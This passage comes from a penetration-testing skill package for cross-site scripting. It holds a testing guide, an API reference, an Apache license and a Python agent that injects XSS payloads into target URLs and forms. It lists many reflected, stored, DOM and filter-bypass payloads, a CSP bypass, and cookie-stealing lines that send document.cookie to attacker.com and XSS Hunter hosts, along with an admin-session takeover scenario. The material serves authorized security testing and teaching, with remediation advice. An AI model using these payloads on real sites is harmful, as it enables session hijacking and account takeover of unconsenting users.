  - CSS context: `<div style="color: USER_INPUT">`

### Step 2: Reflected XSS Testing

Test reflected injection points with context-appropriate payloads:

- **HTML body context**: `<script>alert(document.domain)</script>`, `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>`
- **HTML attribute context**: `" onfocus=alert(1) autofocus="`, `" onmouseover=alert(1) "`, `"><script>alert(1)</script>`
- **JavaScript string context**: `';alert(1)//`, `\';alert(1)//`, `</script><script>alert(1)</script>`
- **URL/href context**: `javascript:alert(1)`, `data:text/html,<script>alert(1)</script>`
- **Inside HTML comments**: `--><script>alert(1)</script><!--`
- **Filter bypass payloads** (when basic payloads are blocked):
  - Case variation: `<ScRiPt>alert(1)</sCrIpT>`
  - Event handlers: `<details open ontoggle=alert(1)>`
  - SVG: `<svg><animate onbegin=alert(1) attributeName=x>`
  - Encoding: `<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>`

### Step 3: Stored XSS Testing

Test persistent storage points that render input to other users:

- Submit XSS payloads to every stored input field identified in Step 1
- Use a unique identifier in each payload to track which inputs trigger: `<script>alert('XSS-PROFILE-001')</script>`
- Check all locations where the stored input is rendered (the same input may appear on multiple pages)
- Test file upload features with HTML files containing JavaScript, SVG files with embedded scripts, and filenames containing XSS payloads
- Test rich text editors by injecting payloads through the raw HTML mode or by manipulating the POST data after the client-side editor sanitizes
- Use XSS Hunter payloads (`"><script src=https://yourxsshunter.xss.ht></script>`) for blind stored XSS where the payload fires in an admin panel or internal tool you cannot directly access

### Step 4: DOM-Based XSS Testing

Analyze client-side JavaScript for unsafe DOM manipulation:

- **Source identification**: Search JavaScript for dangerous sources that read attacker-controlled input:
  - `document.location`, `document.URL`, `document.referrer`
  - `location.hash`, `location.search`, `location.href`
  - `window.name`, `postMessage` event data
- **Sink identification**: Search for dangerous sinks that write to the DOM:
  - `innerHTML`, `outerHTML`, `document.write()`, `document.writeln()`
  - `eval()`, `setTimeout()`, `setInterval()`, `Function()`
  - `element.setAttribute()` with event handlers, `jQuery.html()`, `.append()`, `v-html` (Vue), `dangerouslySetInnerHTML` (React)
- **Trace data flow**: Follow the path from source to sink. If user-controlled input reaches a dangerous sink without proper sanitization, DOM XSS exists.
- **Framework-specific testing**: Test React `dangerouslySetInnerHTML`, Angular template injection (`{{constructor.constructor('alert(1)')()}}`), Vue `v-html` directive

### Step 5: CSP Bypass and Advanced Exploitation

Test Content Security Policy effectiveness and demonstrate real-world impact:

- **CSP analysis**: Review the CSP header for weaknesses:
  - `unsafe-inline` in script-src allows inline scripts
  - `unsafe-eval` allows eval() and similar functions
  - Wildcard domains (`*.googleapis.com`) may host JSONP endpoints usable for CSP bypass
  - `base-uri` not set allows `<base>` tag injection to redirect relative script loads
- **JSONP bypass**: If CSP allows a domain with JSONP endpoints, use `<script src="https://allowed-domain.com/jsonp?callback=alert(1)"></script>`
- **Impact demonstration**:
  - Session hijacking: `<script>new Image().src="https://attacker.com/steal?c="+document.cookie</script>`
  - Credential phishing: Inject a fake login form overlay that submits to the attacker's server
  - Keylogging: Inject JavaScript that captures keystrokes on the page
  - Account takeover: Use XSS to change the victim's email address and trigger a password reset

## Key Concepts

| Term | Definition |
|------|------------|
| **Reflected XSS** | Non-persistent XSS where the injected payload is included in the server's response to the same request, requiring the victim to click a crafted URL |
| **Stored XSS** | Persistent XSS where the payload is saved on the server and served to other users who view the affected page |
| **DOM-Based XSS** | XSS that occurs entirely in the browser when client-side JavaScript reads attacker-controlled data and writes it to a dangerous DOM sink |
| **Content Security Policy** | HTTP response header that restricts which sources the browser can load scripts, styles, and other resources from, providing defense-in-depth against XSS |
| **Output Encoding** | Converting special characters to their HTML entity equivalents (e.g., `<` to `&lt;`) to prevent the browser from interpreting user input as code |
| **Sink** | A JavaScript function or DOM property that can cause code execution or HTML rendering if attacker-controlled data reaches it unsanitized |

## Tools & Systems

- **Burp Suite Professional**: HTTP proxy with active scanning for reflected and stored XSS, plus Repeater and Intruder for manual payload testing
- **XSS Hunter**: Hosted service that generates payloads which phone home with screenshots, cookies, and DOM content when triggered, essential for blind stored XSS
- **DOMPurify**: Client-side sanitization library used by developers to prevent XSS; testers should test for bypass techniques against the deployed version
- **Browser Developer Tools**: Console, Network, and Elements tabs for tracing DOM-based XSS data flows and testing payloads in real-time

## Common Scenarios

### Scenario: Stored XSS in Customer Support Ticket System

**Context**: An e-commerce platform has a customer support system where customers submit tickets that are viewed by support agents in an internal admin panel. The ticket submission form accepts HTML formatting.

**Approach**:
1. Submit a support ticket with a unique XSS Hunter payload in the ticket description
2. The payload fires when a support agent views the ticket in the admin panel, sending a callback with the agent's session cookie, page DOM, and screenshot
3. Use the captured admin session cookie to access the admin panel as the support agent
4. From the admin panel, access customer records, order data, and refund functionality
5. Document the attack chain: customer submits ticket -> agent views ticket -> XSS fires -> session stolen -> admin panel compromised
6. Test if CSP would have prevented the attack (in this case, no CSP header was present)

**Pitfalls**:
- Only testing for `<script>alert(1)</script>` and missing XSS that fires through event handlers or in non-HTML contexts
- Not testing stored XSS in features that render to administrative users (support tickets, user profiles viewed by admins)
- Ignoring DOM-based XSS in single-page applications where the server-side code is secure but client-side rendering is vulnerable
- Not checking for XSS in HTTP headers (Referer, User-Agent) that may be logged and rendered in admin dashboards

## Output Format

```
## Finding: Stored XSS in Support Ticket Description

**ID**: XSS-002
**Severity**: High (CVSS 8.1)
**Affected URL**: POST /api/tickets (submission), GET /admin/tickets/8847 (trigger)
**Parameter**: description (POST body)
**XSS Type**: Stored (persistent)

**Description**:
The support ticket description field does not sanitize HTML input before storing
it in the database. When a support agent views the ticket in the admin panel, the
unsanitized HTML is rendered in the agent's browser, allowing arbitrary JavaScript
execution in the context of the admin application.

**Proof of Concept**:
Submitted ticket with payload:
<img src=x onerror="fetch('https://xsshunter.example/callback?c='+document.cookie)">

The payload fired when the agent viewed the ticket, exfiltrating the admin session
cookie to the XSS Hunter server.

**Impact**:
An attacker can steal the session tokens of support agents and administrators,
gaining access to the admin panel with privileges to view customer PII, process
refunds, and modify orders. Affects all 23 support agents who view customer tickets.

**Remediation**:
1. Implement output encoding using a context-aware library (OWASP Java Encoder,
   DOMPurify for client-side rendering)
2. Deploy Content Security Policy header:
   Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
3. Set HttpOnly flag on session cookies to prevent JavaScript access
4. Sanitize HTML input server-side using a whitelist approach (allow only safe tags)
```

===== END FILE =====


===== FILE: skills/testing-for-xss-vulnerabilities/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/testing-for-xss-vulnerabilities/references/api-reference.md =====
# API Reference: Testing for XSS Vulnerabilities

## requests Library for XSS Testing

### Reflection Testing
```python
from urllib.parse import quote
# Inject canary to find reflection points
resp = requests.get(f"{url}?q={canary}")
if canary in resp.text:
    # Input is reflected - test payloads
    resp = requests.get(f"{url}?q={quote(payload)}")
```

## XSS Payload Categories
| Context | Example Payload |
|---------|----------------|
| HTML body | `<script>alert(document.domain)</script>` |
| HTML attribute | `" onfocus=alert(1) autofocus="` |
| JavaScript string | `';alert(1)//` |
| URL/href | `javascript:alert(1)` |
| Event handler | `<img src=x onerror=alert(1)>` |
| SVG | `<svg onload=alert(1)>` |
| Filter bypass | `<ScRiPt>alert(1)</sCrIpT>` |

## XSS Types
| Type | Description | Persistence |
|------|-------------|-------------|
| Reflected | Payload in URL/request, reflected in response | Non-persistent |
| Stored | Payload saved server-side, rendered to others | Persistent |
| DOM-based | Payload processed by client-side JavaScript | Client-side |

## CSP Analysis
| Directive | Insecure Value | Risk |
|-----------|---------------|------|
| `script-src` | `'unsafe-inline'` | Allows inline `<script>` tags |
| `script-src` | `'unsafe-eval'` | Allows `eval()` and similar |
| `script-src` | `*.googleapis.com` | May host JSONP endpoints |
| `base-uri` | Not set | Allows `<base>` tag injection |
| `default-src` | `*` | Allows scripts from any origin |

## Cookie Security Flags
| Flag | Purpose |
|------|---------|
| `HttpOnly` | Prevents JavaScript access to cookies |
| `Secure` | Only send over HTTPS |
| `SameSite` | Cross-site request protection |

## References
- OWASP XSS Guide: https://owasp.org/www-community/attacks/xss/
- XSS Filter Evasion: https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
- CSP Evaluator: https://csp-evaluator.withgoogle.com/
- PortSwigger XSS: https://portswigger.net/web-security/cross-site-scripting

===== END FILE =====


===== FILE: skills/testing-for-xss-vulnerabilities/scripts/agent.py =====
#!/usr/bin/env python3
"""Agent for testing Cross-Site Scripting (XSS) vulnerabilities during authorized assessments."""

import requests
import json
import argparse
import urllib3
from datetime import datetime
from urllib.parse import urljoin, quote

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

XSS_PAYLOADS = {
    "html_body": [
        '<script>alert(document.domain)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '<body onload=alert(1)>',
    ],
    "html_attribute": [
        '" onfocus=alert(1) autofocus="',
        '" onmouseover=alert(1) "',
        '"><script>alert(1)</script>',
        "' onfocus=alert(1) autofocus='",
    ],
    "javascript_context": [
        "';alert(1)//",
        "\\';alert(1)//",
        "</script><script>alert(1)</script>",
    ],
    "filter_bypass": [
        '<ScRiPt>alert(1)</sCrIpT>',
        '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>',
        '<svg/onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
    ],
}

CANARY = "xsscanary7391"


def detect_reflection_context(response_text, canary):
    """Determine the rendering context of reflected input."""
    contexts = []
    if f">{canary}<" in response_text or f">{canary} " in response_text:
        contexts.append("html_body")
    if f'="{canary}"' in response_text or f"='{canary}'" in response_text:
        contexts.append("html_attribute")
    if f"'{canary}'" in response_text or f'"{canary}"' in response_text:
        if "<script>" in response_text.lower():
            contexts.append("javascript_context")
    if f'href="{canary}' in response_text or f"href='{canary}" in response_text:
        contexts.append("url_context")
    return contexts if contexts else ["html_body"]


def test_reflected_xss(base_url, params, token=None):
    """Test URL parameters for reflected XSS."""
    print("\n[*] Testing reflected XSS...")
    findings = []
    headers = {}
    if token:
        headers["Authorization"] = f"Bearer {token}"

    for param_url in params:
        url = urljoin(base_url, param_url)
        canary_url = url.replace("FUZZ", CANARY)
        try:
            resp = requests.get(canary_url, headers=headers, timeout=10, verify=False)
            if CANARY not in resp.text:
                continue
            contexts = detect_reflection_context(resp.text, CANARY)
            print(f"  [+] Reflection found at {param_url} (contexts: {contexts})")
            char_test_url = url.replace("FUZZ", '<>"\'&/')
            char_resp = requests.get(char_test_url, headers=headers, timeout=10, verify=False)
            unencoded = []
            for ch in ['<', '>', '"', "'", '/']:
                if ch in char_resp.text and f"&{ch}" not in char_resp.text:
                    unencoded.append(ch)

            for context in contexts:
                payloads = XSS_PAYLOADS.get(context, XSS_PAYLOADS["html_body"])
                for payload in payloads:
                    test_url = url.replace("FUZZ", quote(payload))
                    try:
                        test_resp = requests.get(test_url, headers=headers, timeout=10, verify=False)
                        if payload in test_resp.text or payload.lower() in test_resp.text.lower():
                            findings.append({
                                "type": "REFLECTED_XSS", "url": param_url,
                                "payload": payload, "context": context,
                                "severity": "HIGH",
                            })
                            print(f"  [!] XSS CONFIRMED: {param_url} | payload: {payload[:50]}")
                            break
                    except requests.RequestException:
                        continue
        except requests.RequestException:
            continue
    return findings


def test_stored_xss(base_url, submit_endpoint, display_endpoint, token, field="body"):
    """Test stored XSS via form submission."""
    print(f"\n[*] Testing stored XSS on {submit_endpoint}...")
    findings = []
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
    submit_url = urljoin(base_url, submit_endpoint)
    display_url = urljoin(base_url, display_endpoint)

    for payload_type, payloads in XSS_PAYLOADS.items():
        for payload in payloads[:2]:
            marker = f"XSS-{payload_type}-{hash(payload) % 10000}"
            tagged_payload = f"{marker}:{payload}"
            try:
                resp = requests.post(submit_url, headers=headers,
                                     json={field: tagged_payload}, timeout=10, verify=False)
                if resp.status_code in (200, 201):
                    display_resp = requests.get(display_url, headers=headers,
                                                timeout=10, verify=False)
                    if payload in display_resp.text:
                        findings.append({
                            "type": "STORED_XSS", "submit": submit_endpoint,
                            "display": display_endpoint, "payload": payload,
                            "severity": "CRITICAL",
                        })
                        print(f"  [!] STORED XSS: {payload[:50]}")
                        break
            except requests.RequestException:
                continue
    return findings


def check_csp_header(base_url):
    """Analyze Content Security Policy header for XSS protection."""
    print(f"\n[*] Checking CSP header on {base_url}...")
    findings = []
    try:
        resp = requests.get(base_url, timeout=10, verify=False)
        csp = resp.headers.get("Content-Security-Policy", "")
        xxp = resp.headers.get("X-XSS-Protection", "")

        if not csp:
            findings.append({"type": "NO_CSP", "severity": "MEDIUM"})
            print("  [!] No Content-Security-Policy header")
        else:
            print(f"  [+] CSP: {csp[:100]}...")
            if "unsafe-inline" in csp:
                findings.append({"type": "CSP_UNSAFE_INLINE", "severity": "HIGH"})
                print("  [!] CSP allows 'unsafe-inline'")
            if "unsafe-eval" in csp:
                findings.append({"type": "CSP_UNSAFE_EVAL", "severity": "HIGH"})
                print("  [!] CSP allows 'unsafe-eval'")
            if "*" in csp:
                findings.append({"type": "CSP_WILDCARD", "severity": "MEDIUM"})
                print("  [!] CSP contains wildcard domains")

        if not xxp:
            print("  [INFO] No X-XSS-Protection header (deprecated)")
        cookie_headers = resp.headers.get("Set-Cookie", "")
        if cookie_headers and "httponly" not in cookie_headers.lower():
            findings.append({"type": "COOKIE_NO_HTTPONLY", "severity": "MEDIUM"})
            print("  [!] Session cookie missing HttpOnly flag")
    except requests.RequestException as e:
        print(f"  [-] Error: {e}")
    return findings


def generate_report(findings, output_path):
    """Generate XSS assessment report."""
    report = {
        "assessment_date": datetime.now().isoformat(),
        "total_findings": len(findings),
        "by_type": {},
        "findings": findings,
    }
    for f in findings:
        t = f.get("type", "UNKNOWN")
        report["by_type"][t] = report["by_type"].get(t, 0) + 1
    with open(output_path, "w") as fh:
        json.dump(report, fh, indent=2)
    print(f"\n[*] Report: {output_path} | Findings: {len(findings)}")


def main():
    parser = argparse.ArgumentParser(description="XSS Vulnerability Testing Agent")
    parser.add_argument("base_url", help="Base URL of the target")
    parser.add_argument("--token", help="Bearer token for authenticated testing")
    parser.add_argument("--params", nargs="+", default=["/search?q=FUZZ", "/page?name=FUZZ"])
    parser.add_argument("--submit-endpoint", help="Endpoint to submit stored XSS")
    parser.add_argument("--display-endpoint", help="Endpoint where stored input is displayed")
    parser.add_argument("-o", "--output", default="xss_report.json")
    args = parser.parse_args()

    print(f"[*] XSS Vulnerability Assessment: {args.base_url}")
    findings = []
    findings.extend(check_csp_header(args.base_url))
    findings.extend(test_reflected_xss(args.base_url, args.params, args.token))
    if args.submit_endpoint and args.display_endpoint:
        findings.extend(test_stored_xss(args.base_url, args.submit_endpoint,
                                         args.display_endpoint, args.token))
    generate_report(findings, args.output)


if __name__ == "__main__":
    main()

===== END FILE =====
